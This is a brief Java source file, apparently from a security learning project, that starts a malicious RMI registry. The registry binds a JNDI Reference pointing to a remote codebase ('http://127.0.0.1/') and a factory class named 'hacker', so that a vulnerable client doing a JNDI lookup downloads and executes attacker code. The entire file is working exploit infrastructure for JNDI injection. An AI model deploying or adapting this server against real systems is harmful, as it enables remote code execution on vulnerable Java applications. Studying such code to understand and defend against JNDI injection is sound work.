package edu.hacker.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class hackerServer {
    public static void main(String[] args) throws Exception{
        Registry hackerRegister = LocateRegistry.getRegistry(1099);
        Reference reference = new Reference("hacker","hacker","http://127.0.0.1/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        hackerRegister.bind("test",referenceWrapper);
    }
}
